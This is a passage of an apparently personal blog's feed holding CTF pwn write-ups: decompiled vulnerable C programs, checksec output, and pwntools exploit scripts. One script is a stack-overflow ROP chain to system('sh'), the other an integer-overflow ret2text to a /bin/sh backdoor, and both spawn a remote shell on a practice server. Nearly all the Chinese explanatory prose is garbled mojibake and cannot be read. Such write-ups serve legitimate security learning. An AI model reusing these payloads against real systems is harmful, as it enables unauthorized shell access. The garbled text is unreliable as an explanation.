canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;ËøôÈ¢òÊ∂âÂèäÂà∞‰∫ÜÊ†àÂä´ÊåÅÊìç‰Ωú,ÈöæÂ∫¶ÂºÄÂßãÈ´òËµ∑Êù•‰∫Ü.&lt;/p&gt;
&lt;h2 id=&quot;1-ÈÄÜÂêë&quot;&gt;1.ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn_2019_ne_5 Â§çÁé∞</title>
    <link href="https://www.fomal.cc/posts/1640936b.html"/>
    <id>https://www.fomal.cc/posts/1640936b.html</id>
    <published>2023-04-09T06:25:05.391Z</published>
    <updated>2023-04-09T06:22:22.080Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>‰∏ÄÈÅìret2libc1ÁöÑÈ¢òÁõÆ,Á®çÂæÆÁªï‰∫Ü‰∏ÄÊ≠•,Áúã‰∫ÜÁ≠îÊ°àÁé∞Âú®Â§çÁé∞‰∏Ä‰∏ã.</p><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Display</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo Printing......&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *(_DWORD *)src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      AddLog(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Display(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Print();</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      GetFlag(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>ÊÉØ‰æãÊü•ÁúãÈò≤Êä§,Ê≤°ÊúâÂºÄÂêØPIEÈò≤Êä§.ÁúãÂèçÁºñËØëÁöÑ‰ª£Á†Å,ÂèëÁé∞<code>src</code>ÊòØÂÖ®Â±ÄÂèòÈáè,Á®ãÂ∫èÁöÑÂäüËÉΩÊòØËæìÂÖ•ËæìÂá∫‰∏Ä‰∏™ÊâÄË∞ìÁöÑÊó•Âøó(‰πüÂ∞±ÊòØ<code>src</code>),ËøôÈáåÂäüËÉΩ<code>getFlag()</code>Âπ∂Ê≤°ÊúâË¢´ÊâìÂç∞Âú®ÈÄâÈ°π‰∏≠,ÂÜÖÈÉ®ÁöÑ<code>dest</code>Âä†‰∏ä‰∏Ä‰∏™<code>strcpy()</code>ÊúâÊ†àÊ∫¢Âá∫ÁöÑÊºèÊ¥û,ËøôÈáåÊàë‰ª¨ÂÖàÈÄâÊã©1Ê∑ªÂä†Êó•Âøó,‰πüÂ∞±ÊòØÁªô<code>src</code>ËæìÂÖ•,ÁÑ∂ÂêéÈÄâÊã©ÂäüËÉΩ4,Â∞±Áõ∏ÂΩì‰∫éÊàë‰ª¨ÂØπ<code>dest</code>ËøõË°å‰∫ÜËæìÂÖ•,ÈÇ£‰πàÊ†πÊçÆ<code>dest</code>ÁöÑ‰ΩçÁΩÆ,Êàë‰ª¨Â∏ÉÁΩÆ‰∏ÄÊù°Ë∞ÉÁî®<code>system(&quot;sh&quot;)</code>ÁöÑROPÈìæ,ÂÖàÂäüËÉΩ1ËæìÂÖ•Âà∞<code>src</code>,ÁÑ∂ÂêéÂÜçÂäüËÉΩ4Â§çÂà∂Âà∞<code>dest</code>,Â∞±ÂèØ‰ª•Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄ‰∫Ü.ËøôÈáåÁöÑ<code>'sh\x00'</code>ÊòØÂõ†‰∏∫Êúâ<code>fflush()</code>ÂáΩÊï∞,IDAËôΩÁÑ∂Ê≤°Êü•Âà∞<code>&quot;bin/sh&quot;</code>,‰∏çËøáROPgadgetÂèØ‰ª•Êü•Âà∞<code>'sh'</code>,‰πüÂèØ‰ª•ÊãøÊù•Áî®.ÊúÄÂêéÈôÑ‰∏äexp.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./pwn --string <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080482ea : sh</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28862</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x48</span>+<span class="number">0x4</span></span><br><span class="line">system=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=<span class="number">0x80482EA</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input admin password:&#x27;</span>,<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input new log info:&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;‰∏ÄÈÅìret2libc1ÁöÑÈ¢òÁõÆ,Á®çÂæÆÁªï‰∫Ü‰∏ÄÊ≠•,Áúã‰∫ÜÁ≠îÊ°àÁé∞Âú®Â§çÁé∞‰∏Ä‰∏ã.&lt;/p&gt;
&lt;h2 id=&quot;1-ÈÄÜÂêë&quot;&gt;1.ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
      
    
    
    
    <category term="Â§çÁé∞" scheme="https://www.fomal.cc/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Á¨îËÆ∞</title>
    <link href="https://www.fomal.cc/posts/e1748931.html"/>
    <id>https://www.fomal.cc/posts/e1748931.html</id>
    <published>2023-04-09T06:25:05.379Z</published>
    <updated>2023-04-09T06:21:01.512Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>Â∞Ü‰πãÂâçÂ≠¶‰π†ËøáÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÁöÑÂà©Áî®Áõ∏ÂØπÂÆåÊï¥ÁöÑËÆ∞ÂΩïÊÄªÁªì‰∏ãÊù•.</p><h2 id="ÂâçÁΩÆÂü∫Á°ÄÁü•ËØÜÊ¶ÇËø∞">ÂâçÁΩÆÂü∫Á°ÄÁü•ËØÜÊ¶ÇËø∞</h2><p>‰∏çËßÑËåÉÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰ºö‰∫ßÁîüÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊºèÊ¥û,Âà©Áî®ËøôÁßçÊºèÊ¥ûÂèØ‰ª•ËææÂà∞‰ªªÊÑèÂÜÖÂ≠òËØªÂÜôÁöÑÁõÆÁöÑ.</p><h2 id="ÂøÖË¶ÅÁöÑÊ≥®ÊÑè‰∫ãÈ°π">ÂøÖË¶ÅÁöÑÊ≥®ÊÑè‰∫ãÈ°π</h2><h3 id="1-Ë¶ÅÂØªÊâæÁöÑÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊú¨‰ΩìËÄå‰∏çÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊåáÈíà">1) Ë¶ÅÂØªÊâæÁöÑÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊú¨‰ΩìËÄå‰∏çÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊåáÈíà!</h3><h2 id="1-Ê≥ÑÈú≤Ê†à‰∏äÂÜÖÂÆπ">1.Ê≥ÑÈú≤Ê†à‰∏äÂÜÖÂÆπ</h2><h2 id="2-Ê≥ÑÈú≤ÂÖ∂‰ªñÂÜÖÂ≠òÁöÑÂÜÖÂÆπ">2.Ê≥ÑÈú≤ÂÖ∂‰ªñÂÜÖÂ≠òÁöÑÂÜÖÂÆπ</h2><h2 id="3-‰øÆÊîπÊ†à‰∏äÁöÑÂÜÖÂÆπ">3.‰øÆÊîπÊ†à‰∏äÁöÑÂÜÖÂÆπ</h2><h2 id="4-‰øÆÊîπÂÖ∂‰ªñÂÜÖÂ≠òÁöÑÂÜÖÂÆπ">4.‰øÆÊîπÂÖ∂‰ªñÂÜÖÂ≠òÁöÑÂÜÖÂÆπ</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;Â∞Ü‰πãÂâçÂ≠¶‰π†ËøáÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÁöÑÂà©Áî®Áõ∏ÂØπÂÆåÊï¥ÁöÑËÆ∞ÂΩïÊÄªÁªì‰∏ãÊù•.&lt;/p&gt;
&lt;h2 id=&quot;ÂâçÁΩÆÂü∫Á°ÄÁü•ËØÜÊ¶ÇËø∞&quot;&gt;ÂâçÁΩÆÂü∫Á°ÄÁü•ËØÜÊ¶ÇËø∞&lt;/h2&gt;
&lt;p&gt;‰∏çËßÑËåÉÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰ºö‰∫ßÁîüÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊºèÊ¥û,Âà©Áî®ËøôÁßçÊºèÊ¥ûÂèØ‰ª•ËææÂà∞‰ªªÊÑèÂÜÖÂ≠òËØªÂÜôÁöÑÁõÆÁöÑ.&lt;/p&gt;</summary>
      
    
    
    
    <category term="Á¨îËÆ∞" scheme="https://www.fomal.cc/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>bjdctf_2020_babystack2 WP</title>
    <link href="https://www.fomal.cc/posts/5afc574d.html"/>
    <id>https://www.fomal.cc/posts/5afc574d.html</id>
    <published>2023-04-08T09:41:50.275Z</published>
    <updated>2023-04-09T06:23:18.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>Êï¥Êï∞Ê∫¢Âá∫ÁöÑÈÄªËæëÊºèÊ¥ûÂíåret2textÁªìÂêà,Á¨¨‰∏ÄÊ¨°ÂÅöÊï¥Êï∞Ê∫¢Âá∫.ÂèàÂ≠¶‰∫ÜÊñ∞ÁöÑÊâãÊ≥ï.</p><h2 id="ÈÄÜÂêë">ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>PIEÂíåcanaryÊ≤°ÊúâÊâìÂºÄ,ÂèàÊúâ‰∏™ÂêéÈó®ÂáΩÊï∞,Â∫îËØ•ÊòØret2text‰∫Ü,‰∏çËøáËøô‰∏™Ê†àÊ∫¢Âá∫ÊºèÊ¥û‰∏çÂ•ΩÂà©Áî®,Â¶ÇÊûúÊåâÁùÄÁ®ãÂ∫èÁöÑÈÄªËæëÊù•ÊúÄÂ§ö‰πüÂ∞±ËØªÂÖ•10‰∏™Â≠óÁ¨¶,ÊòæÁÑ∂ÊòØ‰∏çÂ§üÁöÑ,‰ΩÜÊòØËøôÈáåÂú®‰∏ãÈù¢ÁöÑ<code>read()</code>ÂèàÊúâ‰∏Ä‰∏™Êï¥Êï∞Ê∫¢Âá∫ÁöÑÊºèÊ¥û,Âè™Ë¶ÅËæìÂÖ•-1Â∞±ÂèØ‰ª•ËÆ©Êó†Á¨¶Âè∑Êï¥Êï∞<code>nbyts</code>Ê∫¢Âá∫Âà∞ÊúÄÂ§ßÂÄº,ËøôÊ†∑Â∞±ÂèØ‰ª•Ê∫¢Âá∫ÈùûÂ∏∏ÈùûÂ∏∏Â§öÁöÑÂ≠óËäÇÊù•Áî®ÂêéÈó®Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄ‰∫Ü,ÊúÄÂêéÈôÑ‰∏äexp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26177</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x10</span>+<span class="number">0x8</span></span><br><span class="line">backdoor=<span class="number">0x400726</span></span><br><span class="line">ret=<span class="number">0x400599</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;[+]Please input the length of your name:&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(backdoor)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span> ,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;Êï¥Êï∞Ê∫¢Âá∫ÁöÑÈÄªËæëÊºèÊ¥ûÂíåret2textÁªìÂêà,Á¨¨‰∏ÄÊ¨°ÂÅöÊï¥Êï∞Ê∫¢Âá∫.ÂèàÂ≠¶‰∫ÜÊñ∞ÁöÑÊâãÊ≥ï.&lt;/p&gt;
&lt;h2 id=&quot;ÈÄÜÂêë&quot;&gt;ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>bjdctf_2020_babyrop WP</title>
    <link href="https://www.fomal.cc/posts/2dc4f22e.html"/>
    <id>https://www.fomal.cc/posts/2dc4f22e.html</id>
    <published>2023-04-07T12:52:11.552Z</published>
    <updated>2023-04-09T06:23:00.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""></h2><hr><h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>ÁªèÂÖ∏ÁöÑx64‰∏ãÁöÑret2libc3È¢òÁõÆ,ÊúÄËøëÂÅöÁÆÄÂçïÈ¢òÊúâÁÇπÈ∫ª‰∫Ü,‰∏çËøáËøòÊòØÊúâ‰∏Ä‰∫õÂ∑•ÂÖ∑‰ΩøÁî®ÁöÑÂ∞èÁªÜËäÇÂèØ‰ª•ÁßØÁ¥ØÁöÑ.</p><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span 